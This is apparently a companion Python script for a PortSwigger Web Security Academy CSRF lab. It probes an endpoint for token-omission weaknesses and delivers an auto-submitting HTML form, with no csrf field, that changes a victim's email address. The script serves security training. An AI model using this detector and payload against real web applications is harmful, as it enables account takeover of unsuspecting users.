#!/usr/bin/env python3
"""
CSRF where token validation depends on token being present
PortSwigger Web Security Academy -- Cross-Site Request Forgery (CSRF)

Companion script for the writeup: 03-token-validation-token-present.md

What this does:
    Runs the same four detect_csrf() probes as the previous lab against
    /my-account/change-email. This time method-switch comes back negative
    (POST-only is enforced) but token-omission comes back positive -- a
    request built with the csrf key deleted entirely, rather than blanked,
    skips the comparison logic altogether. craft_csrf_payload() picks its
    token-omission strategy for that case: a standard auto-submit POST form
    with no csrf field anywhere in the markup.

Usage:
    python 03-token-validation-token-present.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def _get_csrf(client: httpx.Client, path: str = "/my-account") -> str:
    r = client.get(path)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    if m:
        return m.group(1)
    m = re.search(r'name=csrf\s+value=([^\s>]+)', r.text)
    return m.group(1) if m else ""


def _login(client: httpx.Client, username: str = "wiener", password: str = "peter") -> bool:
    csrf = _get_csrf(client, "/login")
    r = client.post("/login", data={"csrf": csrf, "username": username, "password": password})
    return r.status_code < 400 and "Log out" in r.text


def _get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    return m.group(1).rstrip("/") if m else ""


def _accepted(r: httpx.Response) -> bool:
    if r.status_code >= 400:
        return False
    text_lower = r.text.lower()
    rejection_phrases = ["invalid csrf", "csrf token", "bad request", "forbidden",
                          "missing token", "token mismatch", "unauthorized"]
    return not any(p in text_lower for p in rejection_phrases)


def detect(client: httpx.Client, url: str, data: dict, token_param: str = "csrf") -> dict:
    """Layer 1 Detector, trimmed to the four probes detect_csrf() runs in CSRF.py."""
    data_no_token = {k: v for k, v in data.items() if k != token_param}
    results = {}

    r = client.post(url, data=data_no_token)
    results["no_token_works"] = _accepted(r)

    r = client.post(url, data={**data, token_param: ""})
    results["blank_token_works"] = _accepted(r)

    r = client.get(url, params=data_no_token)
    results["method_switch_works"] = _accepted(r)

    r = client.post(url, data=data, headers={"Referer": ""})
    results["referer_absent_works"] = _accepted(r)

    return results


def _exploit_server_deliver(exploit_url: str, body: str, headers: str) -> bool:
    with httpx.Client(follow_redirects=True, timeout=20) as c:
        r = c.post(exploit_url, data={
            "responseFile": "/exploit",
            "responseBody": body,
            "responseHead": headers,
            "formAction": "DELIVER_TO_VICTIM",
        })
    return r.status_code < 400


def solve(lab_url: str) -> None:
    client = httpx.Client(
        base_url=lab_url, follow_redirects=True, timeout=20,
        headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
    )
    client.get("/")

    exploit_url = _get_exploit_server_url(client)
    if not exploit_url:
        print("[-] No exploit server found.")
        return

    if not _login(client):
        print("[-] Login as wiener:peter failed.")
        return

    csrf = _get_csrf(client, "/my-account")
    endpoint = f"{lab_url}/my-account/change-email"
    results = detect(client, endpoint, {"csrf": csrf, "email": "test@test.com"})
    print(f"[*] no_token_works={results['no_token_works']}  blank_token_works={results['blank_token_works']}")
    print(f"[*] method_switch_works={results['method_switch_works']}  referer_absent_works={results['referer_absent_works']}")

    if not results["no_token_works"]:
        print("[-] Token omission not accepted on this instance -- the exploit assumption doesn't hold here.")
        return

    html = (
        '<html><body>\n'
        f'<form action="{endpoint}" method="POST">\n'
        '  <input type="hidden" name="email" value="hacker@evil-user.net" />\n'
        '  <!-- NO csrf param at all -->\n'
        '</form>\n'
        '<script>document.forms[0].submit();</script>\n'
        '</body></html>'
    )
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    print("[*] Technique: Token omission: form without CSRF param")

    _exploit_server_deliver(exploit_url, html, headers)
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved -- victim's email was changed via the token-omitted POST.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
